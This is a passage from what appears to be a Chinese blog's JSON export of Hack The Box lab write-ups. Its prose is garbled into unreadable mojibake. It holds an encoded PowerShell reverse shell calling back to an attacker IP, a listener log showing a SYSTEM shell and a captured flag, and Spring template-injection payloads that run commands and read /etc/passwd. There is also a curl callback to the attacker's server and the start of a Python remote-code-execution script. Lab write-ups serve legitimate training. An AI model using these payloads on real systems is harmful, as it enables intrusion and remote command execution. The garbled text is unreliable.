AgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAgAD0AIAAkAGwAaQBzAHQAZQBuAGUAcgAuAEEAYwBjAGUAcAB0AFQAYwBwAEMAbABpAGUAbgB0ACgAKQAKACAAIAAgACAAIAAgACAAIAB9ACAACgAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgAgACAAIAAgACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0ACgAKACAAIAAgACAAIAAgACAAIAAjAFMAZQBuAGQAIABiAGEAYwBrACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAbgBhAG0AZQAgAGEAbgBkACAAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAcwAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAVwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgACIAIAArACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAgACsAIAAiACAAbwBuACAAIgAgACsAIAAkAGUAbgB2ADoAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAArACAAIgBgAG4AQwBvAHAAeQByAGkAZwBoAHQAIAAoAEMAKQAgADIAMAAxADUAIABNAGkAYwByAG8AcwBvAGYAdAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgAuACAAQQBsAGwAIAByAGkAZwBoAHQAcwAgAHIAZQBzAGUAcgB2AGUAZAAuAGAAbgBgAG4AIgApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAIwBTAGgAbwB3ACAAYQBuACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHAAcgBvAG0AcAB0AAoAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlAHMAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAnAFAAUwAgACcAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAnAD4AJwApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABFAG4AYwBvAGQAZQBkAFQAZQB4AHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAkAEUAbgBjAG8AZABlAGQAVABlAHgAdAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBFAHgAZQBjAHUAdABlACAAdABoAGUAIABjAG8AbQBtAGEAbgBkACAAbwBuACAAdABoAGUAIAB0AGEAcgBnAGUAdAAuAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0AVwBhAHIAbgBpAG4AZwAgACIAUwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgAiACAACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACQAXwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAeAAgAD0AIAAoACQAZQByAHIAbwByAFsAMABdACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZQByAHIAbwByAC4AYwBsAGUAYQByACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgACsAIAAkAHgACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAUgBlAHQAdQByAG4AIAB0AGgAZQAgAHIAZQBzAHUAbAB0AHMACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQAgACAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFcAYQByAG4AaQBuAGcAIAAiAFMAbwBtAGUAdABoAGkAbgBnACAAdwBlAG4AdAAgAHcAcgBvAG4AZwAhACAAQwBoAGUAYwBrACAAaQBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGkAcwAgAHIAZQBhAGMAaABhAGIAbABlACAAYQBuAGQAIAB5AG8AdQAgAGEAcgBlACAAdQBzAGkAbgBnACAAdABoAGUAIABjAG8AcgByAGUAYwB0ACAAcABvAHIAdAAuACIAIAAKACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAkAF8ACgAgACAAIAAgAH0ACgB9AAoACgBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQAwAC4AMQAwAC4AMQA2AC4AMgAgAC0AUABvAHIAdAAgADQANAA0ADQACgA= ç„¶åç‚¹å‡»å³è¾¹çš„å°é“ƒé“›è¿è¡Œ â”Œâ”€â”€(rootã‰¿kali)-[/opt/nishang] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.2] from (UNKNOWN) [10.10.10.152] 51165 Windows PowerShell running as user NETMON$ on NETMON Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32&gt;whoami nt authority\\system æˆåŠŸæ‹¿åˆ° system æƒé™ PS C:\\users\\administrator\\desktop&gt; cat root.txt e8d8f9949c60a0501831df4efa8613bc æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"RedPanda - Hackthebox - æœªåšææƒ","slug":"Hackthebox - RedPanda","date":"2022-10-24T11:38:36.000Z","updated":"2023-05-20T02:57:19.000Z","comments":true,"path":"2022/10/24/Hackthebox - RedPanda/","link":"","permalink":"http://www.lucifiel.com/2022/10/24/Hackthebox%20-%20RedPanda/","excerpt":"","text":"Hackthebox - RedPandaé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapnmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.170 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 09:15 CST Nmap scan report for 10.10.11.170 Host is up (0.41s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 8080/tcp open http-proxy | fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8 | Content-Language: en-US | Date: Sun, 23 Oct 2022 01:16:00 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&quot;en&quot; dir=&quot;ltr&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;utf-8&quot;&gt; | &lt;meta author=&quot;wooden_k&quot;&gt; | &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/panda.css&quot; type=&quot;text/css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/main.css&quot; type=&quot;text/css&quot;&gt; | &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;div class=&#39;pande&#39;&gt; | &lt;div class=&#39;ear left&#39;&gt;&lt;/div&gt; | &lt;div class=&#39;ear right&#39;&gt;&lt;/div&gt; | &lt;div class=&#39;whiskers left&#39;&gt; | &lt;span&gt;&lt;/span&gt; | &lt;span&gt;&lt;/span&gt; | &lt;span&gt;&lt;/span&gt; | &lt;/div&gt; | &lt;div class=&#39;whiskers right&#39;&gt; | &lt;span&gt;&lt;/span&gt; | &lt;span&gt;&lt;/span&gt; | &lt;span&gt;&lt;/span&gt; | &lt;/div&gt; | &lt;div class=&#39;face&#39;&gt; | &lt;div class=&#39;eye | HTTPOptions: | HTTP/1.1 200 | Allow: GET,HEAD,OPTIONS | Content-Length: 0 | Date: Sun, 23 Oct 2022 01:16:01 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Sun, 23 Oct 2022 01:16:02 GMT | Connection: close | &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 | Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 |_ Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; |_http-open-proxy: Proxy might be redirecting requests |_http-title: Red Panda Search | Made with Spring Boot 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.92%I=7%D=10/23%Time=635495D0%P=arm-apple-darwin21.5.0% SF:r(GetRequest,690,&quot;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;ch SF:arset=UTF-8\\r\\nContent-Language:\\x20en-US\\r\\nDate:\\x20Sun,\\x2023\\x20Oct SF:\\x202022\\x2001:16:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x2 SF:0html&gt;\\n&lt;html\\x20lang=\\&quot;en\\&quot;\\x20dir=\\&quot;ltr\\&quot;&gt;\\n\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\ SF:x20\\x20&lt;meta\\x20charset=\\&quot;utf-8\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20author=\\&quot;w SF:ooden_k\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;!--Codepen\\x20by\\x20khr2003:\\x20https://co SF:depen\\.io/khr2003/pen/BGZdXw\\x20--&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;sty SF:lesheet\\&quot;\\x20href=\\&quot;css/panda\\.css\\&quot;\\x20type=\\&quot;text/css\\&quot;&gt;\\n\\x20\\x20\\x2 SF:0\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/main\\.css\\&quot;\\x20type=\\&quot;te SF:xt/css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;Red\\x20Panda\\x20Search\\x20\\|\\x20Made\\ SF:x20with\\x20Spring\\x20Boot&lt;/title&gt;\\n\\x20\\x20&lt;/head&gt;\\n\\x20\\x20&lt;body&gt;\\n\\n\\ SF:x20\\x20\\x20\\x20&lt;div\\x20class=&#39;pande&#39;&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20 SF:class=&#39;ear\\x20left&#39;&gt;&lt;/div&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class=&#39;ear\\ SF:x20right&#39;&gt;&lt;/div&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class=&#39;whiskers\\x20le SF:ft&#39;&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;/div&gt;\\n\\x20\\x20\\x SF:20\\x20\\x20\\x20&lt;div\\x20class=&#39;whiskers\\x20right&#39;&gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt; SF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;span&gt;&lt;/span&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x SF:20&lt;/div&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20&lt;div\\x20class=&#39;face&#39;&gt;\\n\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20&lt;div\\x20class=&#39;eye&quot;)%r(HTTPOptions,75,&quot;HTTP/1\\.1\\x202 SF:00\\x20\\r\\nAllow:\\x20GET,HEAD,OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x SF:20Sun,\\x2023\\x20Oct\\x202022\\x2001:16:01\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n&quot;)%r(RTSPRequest,24E,&quot;HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20t SF:ext/html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x2 SF:0435\\r\\nDate:\\x20Sun,\\x2023\\x20Oct\\x202022\\x2001:16:02\\x20GMT\\r\\nConnec SF:tion:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;&lt;html\\x20lang=\\&quot;en\\&quot;&gt;&lt;head&gt;&lt;tit SF:le&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request&lt;/title&gt;&lt;styl SF:e\\x20type=\\&quot;text/css\\&quot;&gt;body\\x20{font-family:Tahoma,Arial,sans-serif;}\\x SF:20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;background-color:#525D76;}\\x20 SF:h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16px;}\\x20h3\\x20{font-size: SF:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{h SF:eight:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h SF:1&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/ SF:html&gt;&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=10/23%OT=22%CT=1%CU=40350%PV=Y%DS=2%DC=T%G=Y%TM=635496 OS:14%P=arm-apple-darwin21.5.0)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A OS:)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M53 OS:9ST11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88 OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+ OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4 OS:0%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 537.83 ms 10.10.14.1 2 537.94 ms 10.10.11.170 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.28 seconds Http æŒºå¯çˆ±ä¸€å°ç†ŠçŒ«ï¼Œè¿˜ä¼šçœ¨çœ¼ç› åœ¨ä¸‹é¢æœ‰ä¸ªæœç´¢æ¡†ï¼Œéšä¾¿æœç‚¹ä¸œè¥¿çœ‹çœ‹ çœ‹ç€äº¤äº’ç•Œé¢ï¼Œç¡®å®ä¼šå»æ•°æ®åº“è¿›è¡Œäº¤äº’æŸ¥è¯¢ï¼Œè¿™ç§æ½œæ„è¯†å°±è§‰å¾—å¯èƒ½ä¼šæœ‰æ³¨å…¥ æ²¡æµ‹è¯•å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œå» fuzz è¯•è¯•å§ Fuzz lucifiel@MacBookPro î‚° ~ î‚° ffuf -u &#39;http://10.10.11.170:8080/FUZZ&#39; -w /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.170:8080/FUZZ :: Wordlist : FUZZ: /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ stats [Status: 200, Size: 987, Words: 200, Lines: 33, Duration: 619ms] error [Status: 500, Size: 86, Words: 1, Lines: 1, Duration: 617ms] search [Status: 405, Size: 117, Words: 3, Lines: 1, Duration: 616ms] [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 401ms] :: Progress: [30000/30000] :: Job [1/1] :: 8724 req/sec :: Duration: [0:00:41] :: Errors: 10271 :: æœ‰ä¸€ä¸ª stats ç›®å½•ï¼Œå»çœ‹ä¸€ä¸‹ è¿™è¾¹å‘ç°äº†ä¸€äº›å›¾ç‰‡ï¼Œå»å°è¯•è¯»å–è¯•è¯• è¿™é‡Œæç¤ºç¡®å®æ˜¯æœ‰æ³¨å…¥çš„ï¼Œä¸è¿‡æœ‰ä¸€è¯´ä¸€ï¼Œè¿™å›¾ç‰‡ç¡®å®æŒºæœ‰æ„æ€çš„ ä¸è¿‡æ—¢ç„¶ sql æ³¨å…¥ä¸è¡Œï¼Œé‚£å°±è¯•è¯• ssti å‘—ï¼Œåæ­£å¯ä»¥ç¡®å®šæ¼æ´åœ¨äºæ³¨å…¥äº† æµ‹è¯•å‡ºæ¥äº† è¯­æ³•æ˜¯ *{7*7}ï¼ŒæŠŠ ssti è¯­å¥ä¸­çš„ $ æ›¿æ¢ä¸º * å³å¯ç»•è¿‡ æ¼æ´åˆ©ç”¨æˆ‘ä»¬é€šè¿‡ nmap çš„æ‰«æç»“æœå¯å¾—çŸ¥ï¼Œè¿™ä¸ªç½‘ç«™ä½¿ç”¨çš„æ˜¯ Spring Bootï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šæ˜¯ä¸€ä¸ª java çš„ç¨‹åº æ‰€ä»¥æˆ‘ä»¬å» ssti çš„åˆ©ç”¨è¯­å¥é‡Œæ‰¾ä¸€ä¸‹ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false æˆåŠŸè¯»å–åˆ° &#x2F;etc&#x2F;passwd æ–‡ä»¶ è™½ç„¶å¯ä»¥äº†ï¼Œä½†æ˜¯è½¬æ¢æ ¼å¼è¿˜æ˜¯æœ‰ç‚¹éº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘åˆæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç«  https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;)} ç›´æ¥æ‰§è¡Œä¼¼ä¹ä¼šæç¤ºé”™è¯¯ï¼Œå»å¼€ä¸€ä¸ª http æœåŠ¡è¯•è¯• python3 -m http.server 80 ç„¶åæ”¹ä¸€ä¸‹æŒ‡ä»¤ï¼Œæ¥è¯·æ±‚è¯•è¯• *{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;curl http://10.10.14.2&quot;)} lucifiel@MacBookPro î‚° ~ î‚° python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.170 - - [23/Oct/2022 10:02:07] &quot;GET / HTTP/1.1&quot; 200 - ç›´æ¥æä¸ª rce è„šæœ¬å§ #!/usr/bin/python3 import requests from cmd import Cmd from bs4 import BeautifulSoup print(&quot;&quot;&quot; __ __ __ ______ __ _______ __ _______ __ | | | | | | / | | | | ____| | | | ____| | | | | | | | | | ,----&#39; | | | |__ | | | |__ | | | | | | | | | | | | | __| | | | __| | | | `----. | `--&#39; | | `----. | | | | | | | |____ | `----. |_______| \\______/ \\______| |__| |__| |__| |_______| |_______| &quot;&quot;&quot;) class RCE(Cmd): prompt = &quot;\\033[1;31m$\\033[1;37m &quot; def decimal(self, args): comando = args decimales = [] for i in comando: decimales.append(str(ord(i))) payload = &quot;*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&quot; % decimales[0] for i in decimales[1:]: payload += &quot;.concat(T(java.lang.Character).toString({}))&quot;.format(i) payload += &quot;).getInputStream())}&quot; data = { &quot;name&quot;: payload } requer = requests.post(&quot;http://10.10.11.170:8080/search&quot;, data=data) parser = BeautifulSoup(requer.content, &#39;html.parser&#39;) grepcm = parser.find_all(&quot;h2&quot;)[0].get_text() result = grepcm.replace(&#39;You 